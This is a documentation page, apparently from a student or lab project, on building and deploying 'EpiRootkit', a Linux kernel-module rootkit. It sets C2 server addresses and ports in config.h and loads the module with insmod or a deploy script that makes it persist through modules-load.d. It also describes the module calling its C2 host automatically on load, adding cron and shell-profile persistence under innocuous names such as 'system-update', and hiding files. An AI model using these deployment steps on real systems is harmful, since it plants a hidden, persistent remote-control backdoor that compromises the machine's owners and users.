---
title: "Build & Deployment"
description: "How to build and load EpiRootkit on Ubuntu 20.04"
icon: "code"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 502
---

# Build & Deployment

How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.

## Deployment Architecture

EpiRootkit follows a **two-stage deployment** approach:
- **Stage 1 (Loader)**: `scripts/deploy_rootkit.sh` handles proper module deployment
- **Stage 2 (Runtime)**: Rootkit focuses on functionality, not self-deployment

This separation follows Linux kernel module best practices and eliminates unusual self-copying behavior.

## Requirements

### System
- **OS**: Ubuntu 20.04 LTS
- **Kernel**: 5.4.0-* (check with `uname -r`)
- **Architecture**: x86_64

### Dependencies
```bash
sudo apt update
sudo apt install -y build-essential linux-headers-$(uname -r)
```

## Build Process

### 1. Navigate to Rootkit Directory
```bash
cd rootkit
```

### 2. Build the Module
```bash
make clean && make
```

**Expected output:**
```
make -C /lib/modules/5.4.0-74-generic/build M=/path/to/rootkit modules
  CC [M]  /path/to/rootkit/core/main.o
  CC [M]  /path/to/rootkit/commands/commands.o
  CC [M]  /path/to/rootkit/commands/auth_commands.o
  CC [M]  /path/to/rootkit/commands/exec_commands.o
  CC [M]  /path/to/rootkit/commands/file_commands.o
  CC [M]  /path/to/rootkit/commands/status_commands.o
  CC [M]  /path/to/rootkit/commands/stealth_commands.o
  CC [M]  /path/to/rootkit/network/connection.o
  CC [M]  /path/to/rootkit/network/socket.o
  CC [M]  /path/to/rootkit/network/keepalive.o
  CC [M]  /path/to/rootkit/network/dns_resolver.o
  CC [M]  /path/to/rootkit/stealth/stealth.o
  CC [M]  /path/to/rootkit/persistence/persistence.o
  CC [M]  /path/to/rootkit/security/auth.o
  CC [M]  /path/to/rootkit/security/crypto.o
  CC [M]  /path/to/rootkit/utils/sysfs.o
  LD [M]  /path/to/rootkit/epirootkit.ko
```

### 3. Verify Build
```bash
ls -la epirootkit.ko
file epirootkit.ko
```

Should show: `ELF 64-bit LSB relocatable, x86-64`

## Configuration

### Network Settings
The rootkit now supports both IP addresses and domain names for C2 server configuration.

Edit `rootkit/core/config.h` before building:

```c
// Option 1: Use domain name (recommended for real deployments)
#define C2_SERVER_ADDRESS "jules-c2.example.com"
#define C2_SERVER_PORT 4444

// Option 2: Use IP address (traditional method)
#define C2_SERVER_ADDRESS "192.168.64.1"
#define C2_SERVER_PORT 4444
```

### Feature Settings
```c
#define ENABLE_ENCRYPTION 0      // Encryption disabled
#define ENABLE_PERSISTENCE 1     // Auto-install persistence
#define ENABLE_FILE_HIDING 1     // Hide files with prefixes
```

## Deployment Methods

### Method 1: Deployment Script with Domain Support (Recommended)
The deployment script now supports module parameters for dynamic configuration:

```bash
# Deploy with domain name (🆕 Bonus Feature)
sudo ./deploy_rootkit.sh address=c2.example.com 

# Deploy with IP address (traditional)
sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444

# Deploy with defaults from config.h
sudo ./deploy_rootkit.sh

# Deploy specific module file with parameters
sudo ./deploy_rootkit.sh ./epirootkit.ko address=jules-c2.example.com port=8443
```


**What the deployment script does:**
1. **Validates** module and root privileges
2. **Deploys module** to `/lib/modules/$(uname -r)/extra/`
3. **Sets up autoload** via `/etc/modules-load.d/epirootkit.conf` with parameters
4. **Updates dependencies** with `depmod -a`
5. **Loads module** immediately with specified parameters
6. **Verifies** deployment

### Method 2: Manual Loading with Parameters
For development and testing:

```bash
# Load with domain
sudo insmod epirootkit.ko address=c2.example.com port=443

# Load with IP
sudo insmod epirootkit.ko address=192.168.1.100 port=4444
```

### Verify Loading and DNS Resolution
```bash
# Check if loaded (may be hidden if stealth enabled)
lsmod | grep epirootkit

# Alternative check if module is hidden
ls -la /sys/module/epirootkit

# Check kernel messages for DNS resolution
dmesg | tail -20
```

**Expected kernel messages with domain:**
```
[  123.456] EpiRootkit: Starting initialization (v1.0.0)
[  123.457] EpiRootkit: Module parameters: address=c2.example.com port=443
[  123.458] EpiRootkit: Connection module initialized
[  123.459] EpiRootkit: Stealth module initialized
[  123.460] EpiRootkit: Persistence module initialized
[  123.461] EpiRootkit: All subsystems initialized successfully
[  123.462] EpiRootkit: Attempting connection to c2.example.com:443
[  123.463] EpiRootkit: Resolving domain: c2.example.com
[  123.464] EpiRootkit: Resolved c2.example.com to 203.0.113.42
[  123.465] EpiRootkit: Connected to C2 server c2.example.com:443
```

**Expected kernel messages with IP:**
```
[  123.456] EpiRootkit: Starting initialization (v1.0.0)
[  123.457] EpiRootkit: Module parameters: address=192.168.64.1 port=4444
[  123.458] EpiRootkit: Connection module initialized
[  123.459] EpiRootkit: Stealth module initialized
[  123.460] EpiRootkit: Persistence module initialized
[  123.461] EpiRootkit: All subsystems initialized successfully
[  123.462] EpiRootkit: Attempting connection to 192.168.64.1:4444
[  123.463] EpiRootkit: Connected to C2 server 192.168.64.1:4444
```

## Deployment Management

### Check Status
```bash
sudo ./deploy_rootkit.sh status
```

### Complete Removal
```bash
sudo ./deploy_rootkit.sh uninstall
```

## DNS Resolution Feature (🆕 Bonus)

### How DNS Resolution Works
1. **Parameter parsing**: Module detects if address is domain or IP
2. **IP check**: Uses `in4_pton()` to validate IP format
3. **DNS resolution**: If not IP, uses kernel-space DNS resolver
4. **Google DNS**: Queries 8.8.8.8 for domain resolution
5. **Connection**: Establishes TCP connection to resolved IP

### DNS Implementation Details
- **No userspace dependency**: Pure kernel-space implementation
- **Raw UDP packets**: Manual DNS packet construction/parsing
- **Memory efficient**: Dynamic allocation with proper cleanup
- **Error handling**: Graceful fallback on resolution failures

### Troubleshooting DNS
```bash
# Check if domain resolves manually
nslookup c2.example.com 8.8.8.8

# Check kernel logs for DNS errors
dmesg | grep -i "dns\|resolve"

# Test with IP first if domain fails
sudo ./deploy_rootkit.sh address=8.8.8.8 port=4444
```

## Automatic Features

When the module loads, it automatically:

1. **Connects to C2 server** (with domain resolution if needed)
2. **Installs runtime persistence** (cron, shell profiles) with current parameters
3. **Enables file hiding** (hides files with specific prefixes)
4. **Starts keepalive system** (60-second ping/pong)

**Note**: Module deployment persistence is handled by the deployment script, not the runtime module.

## Module Management

### Unload Module
```bash
sudo rmmod epirootkit
# Or use Makefile target
sudo make remove
```

### Manual Persistence Cleanup
```bash
# Remove runtime persistence mechanisms only
sudo rm -f /etc/cron.d/system-update
sudo rm -f /etc/profile.d/system-env.sh

# Module deployment persistence (handled by deployment script)
sudo rm -f /etc/modules-load.d/epirootkit.conf
sudo rm -f /lib/modules/$(uname -r)/extra/epirootkit.ko
```

### Clean Build
```bash
make clean
```

## File Locations

### Deployment Files (by deploy script)
- **Module**: `/lib/modules/$(uname -r)/extra/epirootkit.ko`
- **Autoload with parameters**: `/etc/modules-load.d/epirootkit.conf`

### Runtime Files (by rootkit)
- **Cron**: `/etc/cron.d/system-update`
- **Profile**: `/etc/profile.d/system-env.sh`

## Next Steps

1. **[Start C2 Server](../03-attacking-program/overview.md)**: Set up command & control
2. **[Authentication](./connection-authentication.md)**: Connect and authenticate with domain support
3. **[Use Commands](./features/command-execution.md)**: Execute remote commands

